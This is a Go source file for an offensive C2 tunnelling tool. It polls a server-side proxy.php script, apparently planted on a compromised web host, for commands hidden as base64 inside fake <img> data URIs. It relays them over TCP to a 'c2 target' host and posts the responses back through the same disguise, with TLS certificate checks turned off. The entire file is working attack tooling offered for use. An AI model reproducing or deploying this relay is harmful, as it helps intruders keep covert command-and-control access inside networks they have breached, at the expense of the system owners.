package main

import (
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"net"
	"net/http"
	"net/url"
	"strings"
	"time"
)

var (
	noneflag   = "Tk9ORQ=="
	Proxy      = ""
	client     *http.Client
	dialTimout = 10 * time.Second
	keepAlive  = 15 * time.Second
	str1       = "================"
	str2       = "<img src=\"data:image/jpg;base64,"
	str3       = "\" />"
	lastlen    = 0
	level      = 0
	Url        = "http://127.0.0.1/proxy.php"
	hostPort   = "127.0.0.1:64535"
)

func init() {
	flag.StringVar(&Url, "u", "http://127.0.0.1/proxy.php", "url,eg http://127.0.0.1/proxy.php")
	flag.StringVar(&hostPort, "t", "127.0.0.1:64535", "c2 target,eg 127.0.0.1:64535 ")
	flag.StringVar(&Proxy, "p", "", "url proxy,eg 8080")
	flag.IntVar(&level, "v", 0, "log level")
	flag.Parse()
	InitHttpClient(Proxy, dialTimout)
}

// 主函数
func main() {
	GetDate()
}

// 获取数据模块
func GetDate() {

	if check(Url) {
		for {
			data, err := getdata(Url)
			if err != nil || strings.Contains(string(data), noneflag) || len(data) == 0 || len(data) == lastlen {
				lastlen = len(data)
				time.Sleep(2 * time.Second)
				continue
			}
			lastlen = len(data)
			Println("getdata")
			Println2(data)
			index1 := bytes.Index(data, []byte(str2))
			if index1 >= 0 {
				data = data[index1+len(str2):]
			}
			index2 := bytes.Index(data, []byte(str3))
			if index2 >= 0 {
				data = data[:index2]
			}

			data1, err := base64.RawURLEncoding.DecodeString(string(data))
			if err != nil {
				fmt.Println("base64 err", err)
				Println2(data)
				continue
			} else {
				Println2(data1)
			}
			if len(data) > 0 {
				SendDate(hostPort, data1, Url)
			}
		}
	}
}

func getdata(Url string) (result []byte, err error) {
	dataResp, err := client.Post(Url, "application/x-www-form-urlencoded", strings.NewReader("DataType=GetData"))
	if err != nil {
		return
	}
	defer dataResp.Body.Close()
	var buf bytes.Buffer
	_, err = io.Copy(&buf, dataResp.Body)
	if err != nil {
		fmt.Println("read error:", err)
		return ioutil.ReadAll(dataResp.Body)
	}
	return buf.Bytes(), err
}

// 数据发送模块
func SendDate(hostPort string, data []byte, url string) {
	Println("senddata")
	conn, err := net.DialTimeout("tcp", hostPort, 10*time.Second)
	defer conn.Close()
	if err != nil {
		fmt.Printf("connect failed, err : %v\n", err.Error())
		return
	}
	_, err = write(conn, data)
	if err != nil {
		fmt.Printf("write failed , err : %v\n", err)
	}
	result, err := read(conn) //TO:SEND
	C2Send := []byte("DataType=PostData&Data=" + str2 + base64.RawURLEncoding.EncodeToString(result) + str3)
	Println("post")
	Println2(C2Send)
	resp, err := client.Post(url, "application/x-www-form-urlencoded", bytes.NewBuffer(C2Send))
	if err != nil {
		fmt.Println("发送数据error: ", err)
		return
	}
	defer resp.Body.Close()
}

func check(Url string) (flag bool) {
	resp, err := client.Get(Url)
	if err != nil {
		fmt.Println("check error:", err)
		return
	}
	content, _ := ioutil.ReadAll(resp.Body)
	defer resp.Body.Close()
	if strings.Contains(string(content), noneflag) {
		fmt.Println("SUCCESS Start getting data ....")
		return true
	} else {
		fmt.Println(string(content))
		fmt.Println("Please check if the script exists and runs...")
	}
	return
}

func read(conn net.Conn) (result []byte, err error) {
	var buf bytes.Buffer
	_, err = io.Copy(&buf, conn)
	if err != nil {
		fmt.Println("read error:", err)
		return
	}
	Println(fmt.Sprintf("%v %v", "read ", buf.Len()))
	Println2(buf.Bytes())
	return buf.Bytes(), err
}

func write(conn net.Conn, data []byte) (n int, err error) {
	Println(fmt.Sprintf("%v %v", "write ", len(data)))
	Println2(data)
	n, err = conn.Write(data)
	return
}

func Println(result string) {
	if level > 0 {
		fmt.Println(str1, result, str1)
	}
}

func Println2(data []byte) {
	switch level {
	case 2:
		num := 1000
		if len(data) > num {
			fmt.Println(string(data[:num]))
		} else {
			fmt.Println(string(data))
		}
	case 3:
		fmt.Println(string(data))
	default:
	}
}

func InitHttpClient(DownProxy string, Timeout time.Duration) error {
	dialer := &net.Dialer{
		Timeout:   dialTimout,
		KeepAlive: keepAlive,
	}

	tr := &http.Transport{
		DialContext:         dialer.DialContext,
		MaxConnsPerHost:     0,
		MaxIdleConns:        0,
		MaxIdleConnsPerHost: 100 * 2,
		IdleConnTimeout:     keepAlive,
		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
		TLSHandshakeTimeout: 5 * time.Second,
		DisableKeepAlives:   false,
	}
	if DownProxy != "" {
		if DownProxy == "1" {
			DownProxy = "http://127.0.0.1:8080"
		} else if !strings.Contains(DownProxy, "://") {
			DownProxy = "http://127.0.0.1:" + DownProxy
		}
		u, err := url.Parse(DownProxy)
		if err != nil {
			return err
		}
		tr.Proxy = http.ProxyURL(u)
	}

	client = &http.Client{
		Transport: tr,
		Timeout:   Timeout,
	}
	return nil
}
